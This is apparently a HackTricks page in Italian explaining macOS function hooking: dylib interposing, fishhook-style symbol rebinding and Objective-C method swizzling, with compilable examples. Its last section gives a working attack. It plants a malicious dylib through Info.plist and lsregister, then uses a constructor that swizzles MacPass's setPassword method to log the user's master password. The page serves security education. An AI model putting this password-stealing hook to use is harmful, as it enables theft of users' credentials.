# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Crea una **dylib** con una sezione **`__interpose` (`__DATA___interpose`)** (o una sezione contrassegnata con **`S_INTERPOSING`**) contenente tuple di **puntatori a funzione** che fanno riferimento alle funzioni **originali** e **sostitutive**.

Poi, **inietta** la dylib con **`DYLD_INSERT_LIBRARIES`** (l'interposing deve avvenire prima del caricamento dell'app principale). Ovviamente anche le [**restrictions**] applicate all'uso di **`DYLD_INSERT_LIBRARIES`** si applicano anche qui.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> La variabile d'ambiente **`DYLD_PRINT_INTERPOSING`** può essere usata per fare debug dell'interposing e stamperà il processo di interpose.

Nota anche che **l'interposing avviene tra il processo e le librerie caricate**, non funziona con la shared library cache.

### Dynamic Interposing

Ora è anche possibile interporre una funzione dinamicamente usando la funzione **`dyld_dynamic_interpose`**. Questo permette di interporre **programmaticamente** una funzione in **runtime** invece che farlo solo dall'**inizio**.

È sufficiente indicare le **tuple** della **funzione da sostituire e della funzione sostitutiva**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Rebinding della tabella di importazione (stile fishhook)

Se hai già esecuzione di codice **all'interno del processo** e vuoi fare hook di una **funzione C importata** senza rilanciare il target, un primitive molto comune è il **symbol rebinding** (reso popolare da **`fishhook`**).

Invece di usare la sezione **`__interpose`**, questa tecnica percorre i metadata Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) e **sovrascrive lo slot di importazione** usato dalla immagine corrente. Questo è molto utile per fare hook di funzioni in un processo **già in esecuzione** oppure per fare hook di **una sola immagine** con **`rebind_symbols_image`**.

> [!TIP]
> Questo influisce solo sulle chiamate che passano effettivamente attraverso un **import pointer**. Se la funzione target è **chiamata direttamente all'interno della stessa immagine**, non esiste alcuno slot importato da riscrivere, quindi questa tecnica non vedrà quel punto di chiamata.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Nelle recenti versioni di macOS molti target di rebinding non si trovano più in pagine **`__DATA`** scrivibili. In genere i rebinder devono rendere temporaneamente **`__DATA_CONST`** scrivibile prima di patchare il puntatore. Inoltre, su Apple Silicon / **`arm64e`** dovresti aspettarti puntatori autenticati e ulteriore indirezione in **`__AUTH_CONST.__auth_got`**, quindi un rebinder che esamina solo le classiche sezioni di symbol pointer lazy/non-lazy potrebbe perdere alcuni call site.

> [!CAUTION]
> L'ABI **`arm64e`** usa **Pointer Authentication (PAC)** per molti function pointer. Le scritture dirette dei puntatori che funzionavano su Intel possono rompere un call site su Apple Silicon. Quando scrivi il tuo rebinder o inline hooker, sii pronto a usare gli helper di **`<ptrauth.h>`** come **`ptrauth_sign_unauthenticated`** o **`ptrauth_auth_and_resign`** e testa specificamente su target **`arm64e`**.

Per maggiori dettagli su **`__AUTH`**, **`__AUTH_CONST`** e **`__auth_got`**, controlla [questa pagina](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

In ObjectiveC questo è il modo in cui viene chiamato un metodo: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Sono necessari l'**oggetto**, il **method** e i **parametri**. E quando viene chiamato un metodo, viene **inviato un msg** usando la funzione **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

L'oggetto è **`someObject`**, il method è **`@selector(method1p1:p2:)`** e gli argomenti sono **value1**, **value2**.

Seguendo le strutture dell'oggetto, è possibile raggiungere un'**array di methods** dove sono **localizzati** i **nomi** e i **puntatori** al codice del method.

> [!CAUTION]
> Nota che, poiché methods e classes sono accessibili in base ai loro nomi, queste informazioni sono memorizzate nel binary, quindi è possibile recuperarle con `otool -ov </path/bin>` o [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

È possibile accedere alle informazioni dei methods come nome, numero di parametri o indirizzo come nell'esempio seguente:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling con method_exchangeImplementations

La funzione **`method_exchangeImplementations`** consente di **cambiare** l'**indirizzo** dell'**implementazione** di **una funzione con l'altra**.

> [!CAUTION]
> Quindi, quando una funzione viene chiamata, ciò che viene **eseguito è l'altra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In questo caso, se il **codice di implementazione del metodo legittimo** **verifica** il **nome del metodo**, potrebbe **rilevare** questo swizzling e impedirne l’esecuzione.
>
> La seguente tecnica non ha questa limitazione.

### Method Swizzling with method_setImplementation

Il formato precedente è strano perché stai cambiando l’implementazione di 2 metodi uno con l’altro. Usando la funzione **`method_setImplementation`** puoi **cambiare** l’**implementazione** di un **metodo con quella dell’altro**.

Ricorda solo di **salvare l’indirizzo dell’implementazione dell’originale** se intendi chiamarlo dalla nuova implementazione prima di sovrascriverlo, perché in seguito sarà molto più complicato individuare quell’indirizzo.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

In questa pagina sono stati discussi diversi modi per hookare funzioni. Tuttavia, implicavano **l'esecuzione di codice all'interno del processo da attaccare**.

Per farlo, la tecnica più semplice da usare è iniettare un [Dyld tramite variabili d'ambiente o hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Tuttavia, immagino che questo potrebbe essere fatto anche tramite [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Tuttavia, entrambe le opzioni sono **limitate** ai binari/processi **non protetti**. Controlla ogni tecnica per saperne di più sulle limitazioni.

Tuttavia, un attacco di function hooking è molto specifico, un attaccante lo farà per **rubare informazioni sensibili dall'interno di un processo** (altrimenti faresti semplicemente un attacco di process injection). E queste informazioni sensibili potrebbero trovarsi in App scaricate dall'utente come MacPass.

Quindi il vettore dell'attaccante sarebbe trovare una vulnerabilità oppure rimuovere la signature dell'applicazione, iniettare la variabile d'ambiente **`DYLD_INSERT_LIBRARIES`** tramite il file Info.plist dell'applicazione aggiungendo qualcosa del genere:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
e poi **re-registrare** l'applicazione:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Aggiungi in quella libreria il codice di hooking per esfiltrare le informazioni: Password, messaggi...

> [!CAUTION]
> Nota che nelle versioni più recenti di macOS, se **rimuovi la signature** del binario dell'applicazione e in precedenza era stato eseguito, macOS **non eseguirà più l'applicazione**.

#### Esempio di libreria
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Riferimenti

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
